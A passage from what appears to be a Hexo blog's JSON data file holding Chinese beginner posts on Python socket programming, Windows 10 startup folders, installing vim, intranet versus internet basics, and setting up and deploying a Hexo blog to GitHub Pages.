class=\"headerlink\" title=\"三、socket常见选项之SO_REUSEADDR,SO_REUSEPORT\"></a>三、<a href=\"https://www.cnblogs.com/HKUI/p/11707170.html\">socket常见选项之SO_REUSEADDR,SO_REUSEPORT</a></h3><ul>\n<li>使端口被释放后可以立即被使用</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"python网络编程\"><a href=\"#python网络编程\" class=\"headerlink\" title=\"python网络编程\"></a>python网络编程</h1><h3 id=\"一、客户端\"><a href=\"#一、客户端\" class=\"headerlink\" title=\"一、客户端\"></a>一、客户端</h3><h4 id=\"TCP客户端\"><a href=\"#TCP客户端\" class=\"headerlink\" title=\"TCP客户端\"></a>TCP客户端</h4>","more":"<pre><code class=\"python\">import socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.send(&quot;hello, world!&quot;)\n\n# 接受数据\n# 最大接受1024字节数据\nresponse = client.recv(1024)\n\nprint(response)\n\n# 关闭套接字\nclient.close()</code></pre>\n<h4 id=\"UDP客户端\"><a href=\"#UDP客户端\" class=\"headerlink\" title=\"UDP客户端\"></a>UDP客户端</h4><pre><code class=\"python\">import socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.sendto(&quot;hello, world!&quot;, (host, port))\n\n# 接收数据\n# 最大接受1024字节数据\ndata, addr = client.recvfrom(1024)\n\nprint(data)\n\n# 关闭套接字\nclient.close()</code></pre>\n<h3 id=\"二、服务器\"><a href=\"#二、服务器\" class=\"headerlink\" title=\"二、服务器\"></a>二、服务器</h3><pre><code class=\"python\">import socket\nimport threading\n\n\n# bind_id留空的意思是本地IP 127.0.0.1\nbind_id = &quot;&quot;  \nbind_port = 9999\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind((bind_id, bind_port))\nserver.listen(5)\nprint(&#39;[*] Listening on &#123;&#125;:&#123;&#125;&#39; .format(bind_id, bind_port))\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print(&#39;[*] Received: &#123;&#125;&#39; .format(request))\n    send_it = &quot;I love you&quot;\n    client_socket.send(send_it.encode())\n    client_socket.close()\n\n\nclient, address = server.accept()\nprint(&quot;[*] Accepted connection from: &#123;&#125;:&#123;&#125;&quot; .format(client, address))\nclient_handler_t1 = threading.Thread(target=handle_client, args=(client, ))\nclient_handler_t1.start()</code></pre>\n<h3 id=\"实战演练\"><a href=\"#实战演练\" class=\"headerlink\" title=\"实战演练\"></a>实战演练</h3><h4 id=\"服务器（采取多线程）\"><a href=\"#服务器（采取多线程）\" class=\"headerlink\" title=\"服务器（采取多线程）\"></a>服务器（采取多线程）</h4><pre><code class=\"python\">import socket\nimport threading\n# from struct import pack\n\n\nclass ThreadSocket(object):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n        # 超时收取，超过5秒没收到客户端回应自动断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack(&#39;QQ&#39;, 5, 0))\n        # 超时发送，超过5秒没将数据传送至客户端断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack(&#39;QQ&#39;, 4, 0))\n\n    def listen(self):\n        self.sock.listen(5)\n        &#39;&#39;&#39;\n        在这里插入对Ctrl+C的控制\n        &#39;&#39;&#39;\n        # 循环连接，可以与多个客户端依次链接\n        # while True:\n        client, address = self.sock.accept()\n        print(&#39;正在接收客户端信息...\\n&#39;)\n        # 超过30秒停止活动\n        # client.settimeout(15)\n        t1 = threading.Thread(target=self.handleClientRequest, args=(\n            client, address))\n        t1.start()\n\n    def handleClientRequest(self, client, address):\n        # 采取循环，使每次与客户端连接都可以进行多次对话\n        while True:\n            try:\n                data = client.recv(1024)\n                print(&#39;显示客户端信息：&#123;&#125;&#39;.format(data))\n                if data:\n                    client.send(data)\n                else:\n                    print(&quot;Client has disconnected&quot;)\n                    break\n            except:\n                client.close()\n\n\nif __name__ == &#39;__main__&#39;:\n    server = ThreadSocket(&#39;&#39;, 9000)\n    server.listen()\n</code></pre>\n<h4 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h4><pre><code class=\"python\">import socket\n\ntarget_host = &#39;127.0.0.1&#39;\ntarget_ip = 9000\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect((target_host, target_ip))\nsend_data = input(&#39;输入你想说的：&#39;)\nclient.send(send_data.encode())\nresponse = client.recv(4096)\n\nprint(response.decode() + &#39;love&#39;)</code></pre>\n<h3 id=\"三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\"><a href=\"#三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\" class=\"headerlink\" title=\"三、socket常见选项之SO_REUSEADDR,SO_REUSEPORT\"></a>三、<a href=\"https://www.cnblogs.com/HKUI/p/11707170.html\">socket常见选项之SO_REUSEADDR,SO_REUSEPORT</a></h3><ul>\n<li>使端口被释放后可以立即被使用</li>\n</ul>"},{"_content":"---\n\n---\n\n## 所有用户的开机自启文件夹\n\n- 英文路径\n\n<!--more-->\n\n```\n# ProgramData目录是隐藏的\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n```\n\n- 中文路径\n\n```\nC:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n\n\n## 指定用户的开机自启文件夹\n\n- 英文路径\n\n```\nC:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\n\n- 中文路径\n\n```\nC:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n- 打开隐藏文件夹的方法\n\n[![BFDqhV.png](https://s1.ax1x.com/2020/10/22/BFDqhV.png)](https://imgchr.com/i/BFDqhV)\n\n","source":"_posts/win_10 开机自启文件夹.md","raw":"---\n\n---\n\n## 所有用户的开机自启文件夹\n\n- 英文路径\n\n<!--more-->\n\n```\n# ProgramData目录是隐藏的\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n```\n\n- 中文路径\n\n```\nC:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n\n\n## 指定用户的开机自启文件夹\n\n- 英文路径\n\n```\nC:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\n\n- 中文路径\n\n```\nC:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n- 打开隐藏文件夹的方法\n\n[![BFDqhV.png](https://s1.ax1x.com/2020/10/22/BFDqhV.png)](https://imgchr.com/i/BFDqhV)\n\n","slug":"win_10 开机自启文件夹","published":1,"date":"2021-03-24T04:15:01.697Z","updated":"2021-03-24T04:15:01.742Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl42i000rdsvt07e82qyu","content":"<hr>\n<hr>\n<h2 id=\"所有用户的开机自启文件夹\"><a href=\"#所有用户的开机自启文件夹\" class=\"headerlink\" title=\"所有用户的开机自启文件夹\"></a>所有用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>\n<span id=\"more\"></span>\n\n<pre><code># ProgramData目录是隐藏的\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code></pre><ul>\n<li>中文路径</li>\n</ul>\n<pre><code>C:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</code></pre><h2 id=\"指定用户的开机自启文件夹\"><a href=\"#指定用户的开机自启文件夹\" class=\"headerlink\" title=\"指定用户的开机自启文件夹\"></a>指定用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>\n<pre><code>C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code></pre><ul>\n<li>中文路径</li>\n</ul>\n<pre><code>C:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</code></pre><ul>\n<li>打开隐藏文件夹的方法</li>\n</ul>\n<p><a href=\"https://imgchr.com/i/BFDqhV\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/10/22/BFDqhV.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"BFDqhV.png\"></a></p>\n","site":{"data":{}},"excerpt":"<hr>\n<hr>\n<h2 id=\"所有用户的开机自启文件夹\"><a href=\"#所有用户的开机自启文件夹\" class=\"headerlink\" title=\"所有用户的开机自启文件夹\"></a>所有用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>","more":"<pre><code># ProgramData目录是隐藏的\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code></pre><ul>\n<li>中文路径</li>\n</ul>\n<pre><code>C:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</code></pre><h2 id=\"指定用户的开机自启文件夹\"><a href=\"#指定用户的开机自启文件夹\" class=\"headerlink\" title=\"指定用户的开机自启文件夹\"></a>指定用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>\n<pre><code>C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code></pre><ul>\n<li>中文路径</li>\n</ul>\n<pre><code>C:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</code></pre><ul>\n<li>打开隐藏文件夹的方法</li>\n</ul>\n<p><a href=\"https://imgchr.com/i/BFDqhV\"><img src=\"https://s1.ax1x.com/2020/10/22/BFDqhV.png\" alt=\"BFDqhV.png\"></a></p>"},{"_content":"# windows10安装vim\n\n[点击链接]([Releases · vim/vim-win32-installer · GitHub](https://github.com/vim/vim-win32-installer/releases))\n\n- 注意：一些杀毒软件可能会阻止安装该软件，允许即可\n- 进入win10命令行，输入vim即可进入界面\n- 默认安装在C:\\Program Files\\Vim\n\n","source":"_posts/windows10安装vim.md","raw":"# windows10安装vim\n\n[点击链接]([Releases · vim/vim-win32-installer · GitHub](https://github.com/vim/vim-win32-installer/releases))\n\n- 注意：一些杀毒软件可能会阻止安装该软件，允许即可\n- 进入win10命令行，输入vim即可进入界面\n- 默认安装在C:\\Program Files\\Vim\n\n","slug":"windows10安装vim","published":1,"date":"2021-03-24T04:15:01.622Z","updated":"2021-03-24T04:15:01.659Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl42j000vdsvt9gbyavyg","content":"<h1 id=\"windows10安装vim\"><a href=\"#windows10安装vim\" class=\"headerlink\" title=\"windows10安装vim\"></a>windows10安装vim</h1><p>[点击链接](<a href=\"https://github.com/vim/vim-win32-installer/releases\">Releases · vim/vim-win32-installer · GitHub</a>)</p>\n<ul>\n<li>注意：一些杀毒软件可能会阻止安装该软件，允许即可</li>\n<li>进入win10命令行，输入vim即可进入界面</li>\n<li>默认安装在C:\\Program Files\\Vim</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"windows10安装vim\"><a href=\"#windows10安装vim\" class=\"headerlink\" title=\"windows10安装vim\"></a>windows10安装vim</h1><p>[点击链接](<a href=\"https://github.com/vim/vim-win32-installer/releases\">Releases · vim/vim-win32-installer · GitHub</a>)</p>\n<ul>\n<li>注意：一些杀毒软件可能会阻止安装该软件，允许即可</li>\n<li>进入win10命令行，输入vim即可进入界面</li>\n<li>默认安装在C:\\Program Files\\Vim</li>\n</ul>\n"},{"title":"内网与外网简介","date":"2020-05-03T01:07:30.000Z","comments":1,"_content":"\n# 内网与外网\n\n[原文链接](https://zhuanlan.zhihu.com/p/147282153)\n\n## 一、名词概念\n\n### 内网\n\n<!--more-->\n\n- 即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。\n\n### 外网\n\n- 即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。\n\n\n\n## 二、区别\n\n1. ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。\n2. 内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。\n3. 内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。\n4. 内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。","source":"_posts/内网与外网简介.md","raw":"---\ntitle: 内网与外网简介\ndate: 2020/5/3 9:07:30\ncomments: ture\ncategories:\n- 网络安全\ntags:\n- 网络\n---\n\n# 内网与外网\n\n[原文链接](https://zhuanlan.zhihu.com/p/147282153)\n\n## 一、名词概念\n\n### 内网\n\n<!--more-->\n\n- 即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。\n\n### 外网\n\n- 即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。\n\n\n\n## 二、区别\n\n1. ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。\n2. 内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。\n3. 内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。\n4. 内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。","slug":"内网与外网简介","published":1,"updated":"2021-03-24T04:15:03.661Z","layout":"post","photos":[],"link":"","_id":"ckq3bl42k000xdsvtfz947uul","content":"<h1 id=\"内网与外网\"><a href=\"#内网与外网\" class=\"headerlink\" title=\"内网与外网\"></a>内网与外网</h1><p><a href=\"https://zhuanlan.zhihu.com/p/147282153\">原文链接</a></p>\n<h2 id=\"一、名词概念\"><a href=\"#一、名词概念\" class=\"headerlink\" title=\"一、名词概念\"></a>一、名词概念</h2><h3 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h3><span id=\"more\"></span>\n\n<ul>\n<li>即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</li>\n</ul>\n<h3 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h3><ul>\n<li>即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</li>\n</ul>\n<h2 id=\"二、区别\"><a href=\"#二、区别\" class=\"headerlink\" title=\"二、区别\"></a>二、区别</h2><ol>\n<li>ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。</li>\n<li>内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。</li>\n<li>内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。</li>\n<li>内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"内网与外网\"><a href=\"#内网与外网\" class=\"headerlink\" title=\"内网与外网\"></a>内网与外网</h1><p><a href=\"https://zhuanlan.zhihu.com/p/147282153\">原文链接</a></p>\n<h2 id=\"一、名词概念\"><a href=\"#一、名词概念\" class=\"headerlink\" title=\"一、名词概念\"></a>一、名词概念</h2><h3 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h3>","more":"<ul>\n<li>即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</li>\n</ul>\n<h3 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h3><ul>\n<li>即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</li>\n</ul>\n<h2 id=\"二、区别\"><a href=\"#二、区别\" class=\"headerlink\" title=\"二、区别\"></a>二、区别</h2><ol>\n<li>ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。</li>\n<li>内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。</li>\n<li>内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。</li>\n<li>内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。</li>\n</ol>"},{"title":"搭建个人博客","date":"2020-05-03T00:46:40.000Z","comments":1,"_content":"# 搭建静态页面个人博客\n\n[参考文献](https://www.jianshu.com/p/189fd945f38f)\n\n[参考文献]()\n\n### 安装hexo\n\n1. 检查电脑是否有node.js\n\n   ```\n   node -v\n   ```\n   <!--more-->\n\n2. 若没有则下载\n\n3. 安装npm\n\n   ```\n   npm install -g hexo-cli\n   这样会报错\n   ```\n\n   \n\n\n\n### 解决错误：\n\nMissing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.\n在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):\n\n```\nmkdir ~/.npm-global\n```\n\n\n\n设置npm全局包的安装路径:\n\n```\nnpm config set prefix '~/.npm-global'\n```\n\n\n\n在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:\n\n```\nexport PATH=~/.npm-global/bin:$PATH\n```\n\n\n\n回到终端运行以下命令, 让配置生效:\n\n```\nsource /etc/profile\n```\n\n\n\n然后全局安装npm包就可以了.\n\n[原文链[接](https://blog.csdn.net/zhangxuekang/article/details/89075039)\n\n\n2. 将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：\n\n   echo 'PATH=\"$PATH:./node_modules/.bin\"' >> ~/.profile\n\n2. 初始化博客框架\n\n\n```\n# 选择一个地方新建博客目录\nnpx hexo init blog\n\n# 生成博客文件夹中的moudle文件夹\nnpx hexo g\n\n# 进行本机器运行测试\nnpx hexo server\n```\n\n\n\n### 主题切换\n\n1. 去hexo官网下载主题，克隆到自己的仓库下\n\n2. 配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题\n\n   并且更改语言设置成zh-CN\n\n3. 在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内\n\n### 博客与github挂钩\n\n1. 在github上新建一个仓库，仓库名为    自己的github名.github.io\n\n2. 在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：\n\n   ```\n   deploy:\n   \ttype: git\n   \trepo: 仓库名称.git  (.git不能少)\n   \tbranch： master\n   ```\n\n3. 安装git部署插件\n\n   ```\n   npm install hexo-deployer-git --save\n   ```\n\n4. 之后\n\n   ```\n   npx hexo clean\n   npx hexo g\n   # 进行网站部署\n   npx hexo d\n   ```\n\n5. 大功告成\n\n## 绑定域名\n\n1. 先去购买域名\n\n2. 进行域名注册\n\n3. 再进行域名解析（必要的环节）\n\n   + 进入解析页面\n   + 添加解析\n   + 在命令行下ping自己的github和博客绑定的仓库\n   + 得到ip地址之后添加到解析列表\n\n4. 进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名\n\n5. 进入blog，依次输入\n\n   \n\n   ```\n   npx hexo clean\n   npx hexo g\n   hexo d\n   ```\n\n6. 大功告成.\n\n\n\n### hexo发生error:spawn failed错误的解决方法\n\n- [原文链接](https://blog.csdn.net/HTL2018/article/details/106876940)\n- 问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容\n\n```\n# 出现错误\nerror:spawn failed...\n#解决方法\n1. 删除blog文件夹中的 .deploy_git 文件夹\n2. 输入 git config --global core.autocrlf false\n3. \n\thexo clean\n\thexo g\n\thexo d\n\n```\n\n","source":"_posts/博客搭建.md","raw":"---\ntitle: 搭建个人博客\ndate: 2020/5/3 8:46:40\ncomments: ture\ncategories:\n- blog\ntags:\n- blog\n---\n# 搭建静态页面个人博客\n\n[参考文献](https://www.jianshu.com/p/189fd945f38f)\n\n[参考文献]()\n\n### 安装hexo\n\n1. 检查电脑是否有node.js\n\n   ```\n   node -v\n   ```\n   <!--more-->\n\n2. 若没有则下载\n\n3. 安装npm\n\n   ```\n   npm install -g hexo-cli\n   这样会报错\n   ```\n\n   \n\n\n\n### 解决错误：\n\nMissing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.\n在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):\n\n```\nmkdir ~/.npm-global\n```\n\n\n\n设置npm全局包的安装路径:\n\n```\nnpm config set prefix '~/.npm-global'\n```\n\n\n\n在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:\n\n```\nexport PATH=~/.npm-global/bin:$PATH\n```\n\n\n\n回到终端运行以下命令, 让配置生效:\n\n```\nsource /etc/profile\n```\n\n\n\n然后全局安装npm包就可以了.\n\n[原文链[接](https://blog.csdn.net/zhangxuekang/article/details/89075039)\n\n\n2. 将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：\n\n   echo 'PATH=\"$PATH:./node_modules/.bin\"' >> ~/.profile\n\n2. 初始化博客框架\n\n\n```\n# 选择一个地方新建博客目录\nnpx hexo init blog\n\n# 生成博客文件夹中的moudle文件夹\nnpx hexo g\n\n# 进行本机器运行测试\nnpx hexo server\n```\n\n\n\n### 主题切换\n\n1. 去hexo官网下载主题，克隆到自己的仓库下\n\n2. 配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题\n\n   并且更改语言设置成zh-CN\n\n3. 在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内\n\n### 博客与github挂钩\n\n1. 在github上新建一个仓库，仓库名为    自己的github名.github.io\n\n2. 在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：\n\n   ```\n   deploy:\n   \ttype: git\n   \trepo: 仓库名称.git  (.git不能少)\n   \tbranch： master\n   ```\n\n3. 安装git部署插件\n\n   ```\n   npm install hexo-deployer-git --save\n   ```\n\n4. 之后\n\n   ```\n   npx hexo clean\n   npx hexo g\n   # 进行网站部署\n   npx hexo d\n   ```\n\n5. 大功告成\n\n## 绑定域名\n\n1. 先去购买域名\n\n2. 进行域名注册\n\n3. 再进行域名解析（必要的环节）\n\n   + 进入解析页面\n   + 添加解析\n   + 在命令行下ping自己的github和博客绑定的仓库\n   + 得到ip地址之后添加到解析列表\n\n4. 进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名\n\n5. 进入blog，依次输入\n\n   \n\n   ```\n   npx hexo clean\n   npx hexo g\n   hexo d\n   ```\n\n6. 大功告成.\n\n\n\n### hexo发生error:spawn failed错误的解决方法\n\n- [原文链接](https://blog.csdn.net/HTL2018/article/details/106876940)\n- 问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容\n\n```\n# 出现错误\nerror:spawn failed...\n#解决方法\n1. 删除blog文件夹中的 .deploy_git 文件夹\n2. 输入 git config --global core.autocrlf false\n3. \n\thexo clean\n\thexo g\n\thexo d\n\n```\n\n","slug":"博客搭建","published":1,"updated":"2021-03-24T04:15:03.739Z","layout":"post","photos":[],"link":"","_id":"ckq3bl42m0011dsvtbi13h47i","content":"<h1 id=\"搭建静态页面个人博客\"><a href=\"#搭建静态页面个人博客\" class=\"headerlink\" title=\"搭建静态页面个人博客\"></a>搭建静态页面个人博客</h1><p><a href=\"https://www.jianshu.com/p/189fd945f38f\">参考文献</a></p>\n<p><a href=\"\">参考文献</a></p>\n<h3 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h3><ol>\n<li><p>检查电脑是否有node.js</p>\n<pre><code>node -v</code></pre><span id=\"more\"></span>\n</li>\n<li><p>若没有则下载</p>\n</li>\n<li><p>安装npm</p>\n<pre><code>npm install -g hexo-cli\n这样会报错</code></pre></li>\n</ol>\n<h3 id=\"解决错误：\"><a href=\"#解决错误：\" class=\"headerlink\" title=\"解决错误：\"></a>解决错误：</h3><p>Missing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.<br>在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):</p>\n<pre><code>mkdir ~/.npm-global</code></pre><p>设置npm全局包的安装路径:</p>\n<pre><code>npm config set prefix &#39;~/.npm-global&#39;</code></pre><p>在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:</p>\n<pre><code>export PATH=~/.npm-global/bin:$PATH</code></pre><p>回到终端运行以下命令, 让配置生效:</p>\n<pre><code>source /etc/profile</code></pre><p>然后全局安装npm包就可以了.</p>\n<p>[原文链<a href=\"https://blog.csdn.net/zhangxuekang/article/details/89075039\">接</a></p>\n<ol start=\"2\">\n<li><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p>\n<p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p>\n</li>\n<li><p>初始化博客框架</p>\n</li>\n</ol>\n<pre><code># 选择一个地方新建博客目录\nnpx hexo init blog\n\n# 生成博客文件夹中的moudle文件夹\nnpx hexo g\n\n# 进行本机器运行测试\nnpx hexo server</code></pre><h3 id=\"主题切换\"><a href=\"#主题切换\" class=\"headerlink\" title=\"主题切换\"></a>主题切换</h3><ol>\n<li><p>去hexo官网下载主题，克隆到自己的仓库下</p>\n</li>\n<li><p>配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题</p>\n<p>并且更改语言设置成zh-CN</p>\n</li>\n<li><p>在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内</p>\n</li>\n</ol>\n<h3 id=\"博客与github挂钩\"><a href=\"#博客与github挂钩\" class=\"headerlink\" 